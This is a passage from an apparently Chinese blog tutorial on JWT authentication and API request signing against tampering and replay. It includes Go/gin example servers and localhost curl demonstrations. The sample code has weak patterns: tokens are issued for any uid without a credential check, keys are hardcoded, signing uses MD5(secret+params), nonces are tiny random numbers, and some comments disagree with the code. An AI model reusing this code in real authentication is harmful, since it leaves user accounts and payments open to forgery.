title="Claims声明"></a>Claims声明</h3><p>声明中有jwt自身预置的，使用时可选。当然，我们也可以加入自定义的声明，<br>如下面例子中的Claims的UserId信息，但一定不要声明重要或私密的信息，因为这些信息是可破解的。</p><h3 id="Signature签名"><a href="#Signature签名" class="headerlink" title="Signature签名"></a>Signature签名</h3><p>在生成jwt的token（令牌的意思）串时，先将Header和Claims用base64编码,再用Header中指定的加密算法，<br>将编码后的2个字符串进行加密（签名）,作用是防止数据篡改。加密时需要用到一个signString签名串(例子中的jwtkey)，我们可指定自己的signString，<br>不同的signString生成的加密结果不一样（解密时可能也需要同样的串，视加密算法而定）。签名部分主要和token的安全性有关，Signature的生成依赖前面两部分。<br>首先将Base64编码后的Header和Payload用.连接在一起，</p><p>令牌的用法一般如下：</p><ol><li>客户端没有令牌时（第一次登陆或者令牌超时失效了）需要先请求生成令牌，此时可能需要玩家输入账号密码给服务器校验</li><li>账号密码校验正确后，服务器会生成token返回给客户端</li><li>后续客户端访问服务器只需要在header上带上token即可，无需再输入账号密码</li><li>服务器从token解析出该token对应的玩家uid，即验证了玩家身份，使用该uid继续后面的逻辑处理。</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/dgrijalva/jwt-go&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jwtkey = []<span class="keyword">byte</span>(<span class="string">&quot;lijunshi2015@163.com&quot;</span>)  <span class="comment">// 这个秘钥需要跟代码分开存储，这样才符合安全规范</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Claims <span class="keyword">struct</span> &#123;</span><br><span class="line">    UserId <span class="keyword">string</span></span><br><span class="line">    jwt.StandardClaims</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/get_token&quot;</span>, genToken)</span><br><span class="line">r.GET(<span class="string">&quot;/check_token&quot;</span>, checkToken)</span><br><span class="line">r.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 颁发token,请求参数为?uid=xxx</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">genToken</span><span class="params">(ctx *gin.Context)</span></span> &#123;</span><br><span class="line">uid := ctx.Query(<span class="string">&quot;uid&quot;</span>)</span><br><span class="line">expireTime := time.Now().Add(<span class="number">7</span> * <span class="number">24</span> * time.Hour) <span class="comment">// 24小时后token过期</span></span><br><span class="line">claims := &amp;Claims &#123;</span><br><span class="line">UserId : uid,</span><br><span class="line">StandardClaims: jwt.StandardClaims &#123;</span><br><span class="line">ExpiresAt: expireTime.Unix(), <span class="comment">// 过期时间</span></span><br><span class="line">IssuedAt: time.Now().Unix(), <span class="comment">// 颁发时间</span></span><br><span class="line">Issuer: <span class="string">&quot;127.0.0.1&quot;</span>,  <span class="comment">// token颁发者</span></span><br><span class="line">Subject: <span class="string">&quot;user token&quot;</span>,  <span class="comment">// token主题</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line">token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)</span><br><span class="line">fmt.Println(token)</span><br><span class="line">tokenString, err := token.SignedString(jwtkey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">ctx.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">&quot;token&quot;</span>: tokenString&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证token</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkToken</span><span class="params">(ctx *gin.Context)</span></span> &#123;</span><br><span class="line">tokenString := ctx.GetHeader(<span class="string">&quot;Authorization&quot;</span>)  <span class="comment">// 从请求头获取token</span></span><br><span class="line"><span class="keyword">if</span> tokenString == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">ctx.JSON(http.StatusUnauthorized, gin.H&#123;<span class="string">&quot;code&quot;</span>: <span class="number">401</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;权限不足&quot;</span>&#125;)</span><br><span class="line">        ctx.Abort()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过token解析出是哪个玩家(UserId)</span></span><br><span class="line">token, claims, err := parseToken(tokenString)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> || !token.Valid &#123;</span><br><span class="line">ctx.JSON(http.StatusUnauthorized, gin.H&#123;<span class="string">&quot;code&quot;</span>: <span class="number">401</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;权限不足&quot;</span>&#125;)</span><br><span class="line">        ctx.Abort()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;token valid, uid:&quot;</span>, claims.UserId)</span><br><span class="line">ctx.JSON(http.StatusUnauthorized, gin.H&#123;<span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="string">&quot;uid&quot;</span>: claims.UserId&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">parseToken</span><span class="params">(tokenString <span class="keyword">string</span>)</span> <span class="params">(*jwt.Token, *Claims, error)</span></span> &#123;</span><br><span class="line">Claims := &amp;Claims&#123;&#125;</span><br><span class="line">token, err := jwt.ParseWithClaims(tokenString, Claims, <span class="function"><span class="keyword">func</span><span class="params">(token *jwt.Token)</span> <span class="params">(i <span class="keyword">interface</span>&#123;&#125;, err error)</span></span> &#123;</span><br><span class="line">        <span class="keyword">return</span> jwtkey, <span class="literal">nil</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> token, Claims, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有token时，带上自己的uid请求生成token</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:8080/get_token?uid=88998899&quot;</span><br><span class="line">&#123;&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiI4ODk5ODg5OSIsImV4cCI6MTYyMDU2Mzk5MywiaWF0IjoxNjE5OTU5MTkzLCJpc3MiOiIxMjcuMC4wLjEiLCJzdWIiOiJ1c2VyIHRva2VuIn0.-78Bw3jHNDZyGQgZPWbEfUTodPRIy9PlD0rVuoUO6ks&quot;&#125;</span><br></pre></td></tr></table></figure><p>有token时请求头带上token，服务器从token解析出uid，完成身份验证。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:8080/check_token&quot; -H &quot;Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiI4ODk5ODg5OSIsImV4cCI6MTYyMDU2Mzk5MywiaWF0IjoxNjE5OTU5MTkzLCJpc3MiOiIxMjcuMC4wLjEiLCJzdWIiOiJ1c2VyIHRva2VuIn0.-78Bw3jHNDZyGQgZPWbEfUTodPRIy9PlD0rVuoUO6ks&quot;</span><br><span class="line">&#123;&quot;code&quot;:200,&quot;uid&quot;:&quot;88998899&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="防篡改，防重放"><a href="#防篡改，防重放" class="headerlink" title="防篡改，防重放"></a>防篡改，防重放</h2><p>篡改：API参数篡改就是恶意人通过抓包的方式获取到请求的接口的参数，通过修改相关的参数，达到欺骗服务器的目的，常用的防止篡改的方式是用签名以及加密的方式。</p><p>重放：API重放攻击就是把之前窃听到的数据原封不动的重新发送给接收方.</p><p>解决方案：</p><ul><li>防篡改：签名</li><li>防重放：timestamp时间戳 + nonce随机数</li></ul><p>timestamp的作用： 每次HTTP请求，都需要加上timestamp参数，然后把timestamp和其他参数一起进行数字签名。HTTP请求从发出到达服务器一般都不会超过60s，所以服务器收到HTTP请求之后，首先判断时间戳参数与当前时间相比较，是否超过了60s，如果超过了则认为是非法的请求。</p><p>nonce的作用： 每次HTTP请求，都需要加上nonce随机数。我们将每次请求的nonce参数存储到一个“集合”中，服务器每次处理HTTP请求时，首先判断该请求的nonce参数是否在该“集合”中，如果存在则认为是非法请求。nonce参数在首次请求时，已经被存储到了服务器上的“集合”中，再次发送请求会被识别并拒绝。</p><p><strong>nonce的一次性可以解决timestamp参数60s(防止重放攻击)的问题，timestamp可以解决nonce参数“集合”越来越大的问题。=</strong></p><h3 id="两种常用的请求签名的方式"><a href="#两种常用的请求签名的方式" class="headerlink" title="两种常用的请求签名的方式"></a>两种常用的请求签名的方式</h3><ol><li>Md5(url+key) 的方式进行，URL+Key字符串拼接后的值用MD5加密生成签名，将签名发送到服务器端，同时服务器端已同样的方式计算出签名，然后比较俩个MD5的值是否相同，来确定URL是否被篡改。</li><li>AES 对称加密，使用URL和秘钥进行加密。</li></ol><p><strong>MD5组合加密解密</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">appKey     &#x3D; &quot;mhxy&quot;</span><br><span class="line">appSecret  &#x3D; &quot;xxx&quot;</span><br><span class="line">encryptStr &#x3D; &quot;param_1&#x3D;xxx&amp;param_2&#x3D;xxx&amp;ak&#x3D;&quot;+appKey+&quot;&amp;ts&#x3D;xxx&quot;+&quot;nonce&#x3D;xxx&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 自定义验证规则</span><br><span class="line">sn &#x3D; MD5(appSecret + encryptStr)</span><br></pre></td></tr></table></figure><p>加密解密都是同一套流程，验证客户端发过来的sn与自己服务器计算的sn是否一致即可。</p><p><strong>AES 对称加密</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">appKey     &#x3D; &quot;mhxy&quot;</span><br><span class="line">appSecret  &#x3D; &quot;xxx&quot;</span><br><span class="line">encryptStr &#x3D; &quot;param_1&#x3D;xxx&amp;param_2&#x3D;xxx&amp;ak&#x3D;&quot;+appKey+&quot;&amp;ts&#x3D;xxx&quot;+&quot;nonce&#x3D;xxx&quot;</span><br><span class="line"></span><br><span class="line">sn &#x3D; AesEncrypt(encryptStr, appSecret)</span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decryptStr &#x3D; AesDecrypt(sn, app_secret)</span><br></pre></td></tr></table></figure><p>将加密前的字符串与解密后的字符串做个对比。相同，表示签名验证成功。</p><p>利用python生成随机秘钥：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = os.urandom(<span class="number">24</span>) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(a)</span><br><span class="line"><span class="string">b&#x27;eUxqsXD/FkNlMR6nIpGvQh8MVlrNTsP4&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="利用MD5做请求签名的例子"><a href="#利用MD5做请求签名的例子" class="headerlink" title="利用MD5做请求签名的例子"></a>利用MD5做请求签名的例子</h3><p>这个请求验证的例子做了以下的请求验证：</p><ol><li>时间戳验证，时间过期或明显不合理的不能通过验证；</li><li>appKey验证，不是注册业务的请求不能通过验证；</li><li>指定时间内收到相同的随机数的请求，不能通过验证，因为有可能是请求被重放了；</li><li>验证签名是否一致，验证请求参数是否被篡改；</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/md5&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;strconv&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> secretKey <span class="keyword">string</span> = <span class="string">&quot;eUxqsXD/FkNlMR6nIpGvQh8MVlrNTsP4&quot;</span> <span class="comment">// 安全规范要求秘钥跟代码要分开存储</span></span><br><span class="line"><span class="keyword">var</span> reqMap <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int64</span>  <span class="comment">// 一般都是放在redis，用expire控制key的存活时间</span></span><br><span class="line"><span class="keyword">var</span> appRegist = <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span> &#123;</span><br><span class="line"><span class="string">&quot;mhxy&quot;</span> : <span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;lol&quot;</span> : <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> expireTime <span class="keyword">int64</span> = <span class="number">600</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MD5</span><span class="params">(str <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;   </span><br><span class="line">s := md5.New()   </span><br><span class="line">s.Write([]<span class="keyword">byte</span>(str))   </span><br><span class="line"><span class="keyword">return</span> hex.EncodeToString(s.Sum(<span class="literal">nil</span>))   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证签名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">md5VerifySign</span><span class="params">(c *gin.Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">ak := c.Query(<span class="string">&quot;ak&quot;</span>)  <span class="comment">// appKey，业务标记</span></span><br><span class="line">sn := c.Query(<span class="string">&quot;sn&quot;</span>)  <span class="comment">// sign，签名</span></span><br><span class="line">ts := c.Query(<span class="string">&quot;ts&quot;</span>)  <span class="comment">// timestamp，时间戳</span></span><br><span class="line">nonce := c.Query(<span class="string">&quot;nonce&quot;</span>) <span class="comment">// 随机数</span></span><br><span class="line"></span><br><span class="line">name := c.Query(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">uid := c.Query(<span class="string">&quot;uid&quot;</span>)</span><br><span class="line">pay := c.Query(<span class="string">&quot;pay&quot;</span>)</span><br><span class="line"></span><br><span class="line">now := time.Now().Unix()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证appkey是否已注册</span></span><br><span class="line"><span class="keyword">if</span> _, ok := appRegist[ak]; !ok &#123;</span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">&quot;appkey error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证过期时间</span></span><br><span class="line">tsInt, _ := strconv.ParseInt(ts, <span class="number">10</span>, <span class="number">64</span>)</span><br><span class="line"><span class="keyword">if</span> tsInt &gt; now || now - tsInt &gt; expireTime &#123;</span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">&quot;ts error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//验证随机数是否重复</span></span><br><span class="line">err := getNonce(uid, nonce)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//验证签名</span></span><br><span class="line"><span class="comment">// url param需要排序</span></span><br><span class="line">urlParmString := fmt.Sprintf(<span class="string">&quot;ak=%s&amp;name=%s&amp;nonce=%s&amp;pay=%s&amp;ts=%s&amp;uid=%s&quot;</span>,ak, name, nonce, pay, ts, uid)</span><br><span class="line">fmt.Println(<span class="string">&quot;urlParmString:&quot;</span>, urlParmString)</span><br><span class="line"><span class="keyword">if</span> sn == <span class="string">&quot;&quot;</span> || sn != createMd5Sign(urlParmString) &#123;</span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">&quot;sn error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">setNonce(uid, nonce)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建签名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createMd5Sign</span><span class="params">(str <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="comment">// 自定义 MD5 组合</span></span><br><span class="line"><span class="keyword">return</span> MD5(secretKey + str)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">setNonce</span><span class="params">(uid <span class="keyword">string</span>, nonce <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">now := time.Now().Unix()</span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int64</span>)</span><br><span class="line">c[nonce] = now</span><br><span class="line"><span class="keyword">if</span> _, ok := reqMap[uid]; !ok &#123;</span><br><span class="line">reqMap[uid] = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int64</span>)</span><br><span class="line">&#125;</span><br><span class="line">reqMap[uid] = c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getNonce</span><span class="params">(uid <span class="keyword">string</span>, nonce <span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">now := time.Now().Unix()</span><br><span class="line"> <span class="keyword">if</span> _, ok := reqMap[uid]; !ok &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, ok := reqMap[uid][nonce]; !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> reqMap[uid][nonce] &gt; <span class="number">0</span> &amp;&amp; now - reqMap[uid][nonce] &gt; expireTime &#123;</span><br><span class="line"><span class="built_in">delete</span>(reqMap[uid], nonce)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">&quot;nonce err&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">genSign</span><span class="params">(c *gin.Context)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">ak := c.Query(<span class="string">&quot;ak&quot;</span>)  <span class="comment">// appKey，业务标记</span></span><br><span class="line">ts := time.Now().Unix()  <span class="comment">// timestamp，时间戳</span></span><br><span class="line">nonce := rand.Intn(<span class="number">100</span>) <span class="comment">// 随机数</span></span><br><span class="line"></span><br><span class="line">name := c.Query(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">uid := c.Query(<span class="string">&quot;uid&quot;</span>)</span><br><span class="line">pay := c.Query(<span class="string">&quot;pay&quot;</span>)</span><br><span class="line"></span><br><span class="line">urlParmString := fmt.Sprintf(<span class="string">&quot;ak=%s&amp;name=%s&amp;nonce=%d&amp;pay=%s&amp;ts=%d&amp;uid=%s&quot;</span>,ak, name, nonce, pay, ts, uid)</span><br><span class="line">sn := createMd5Sign(urlParmString)</span><br><span class="line"><span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%s&amp;sn=%s&quot;</span>, urlParmString,sn)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">reqMap = <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int64</span>&#123;&#125;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/gen_sign&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">sign := genSign(c)</span><br><span class="line">fmt.Println(<span class="string">&quot;生成签名：&quot;</span>, sign)</span><br><span class="line">c.String(http.StatusOK, sign)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">    r.GET(<span class="string">&quot;/check_sign&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">err := md5VerifySign(c)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;验证签名失败：&quot;</span>, err)</span><br><span class="line">c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;验证签名失败, 原因：%+v&quot;</span>, err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;验证签名成功！&quot;</span>)</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;验证签名成功&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">r.Run() <span class="comment">//  listen and serve on 0.0.0.0:8080</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>请求gen_sign获得签名和拼接好的url param请求串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:8080/gen_sign?ak=mhxy&amp;name=james&amp;pay=100&amp;uid=9988998&quot; </span><br><span class="line">ak=mhxy&amp;name=james&amp;nonce=81&amp;pay=100&amp;ts=1620020732&amp;uid=9988998&amp;sn=48247171223ff1b4739ca300e3b7d32djunshide</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果我们篡改请求串然后再去请求签名验证，比如pay字段我们改为1000，会提示验证失败，原因是签名对不上失败了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:8080/check_sign?ak=mhxy&amp;name=james&amp;nonce=81&amp;pay=1000&amp;ts=1620020732&amp;uid=9988998&amp;sn=48247171223ff1b4739ca300e3b7d32d&quot; </span><br><span class="line">验证签名失败, 原因：sn error</span><br></pre></td></tr></table></figure><p>如果我们不修改请求串，直接请求验证签名，签名验证成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:8080/check_sign?ak=mhxy&amp;name=james&amp;nonce=81&amp;pay=100&amp;ts=1620020732&amp;uid=9988998&amp;sn=48247171223ff1b4739ca300e3b7d32d&quot; </span><br><span class="line">验证签名成功</span><br></pre></td></tr></table></figure><p>我们重放这个请求，提示签名失败，原因是随机数重复了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:8080/check_sign?ak=mhxy&amp;name=james&amp;nonce=81&amp;pay=100&amp;ts=1620020732&amp;uid=9988998&amp;sn=48247171223ff1b4739ca300e3b7d32d&quot; </span><br><span class="line">验证签名失败, 原因：nonce 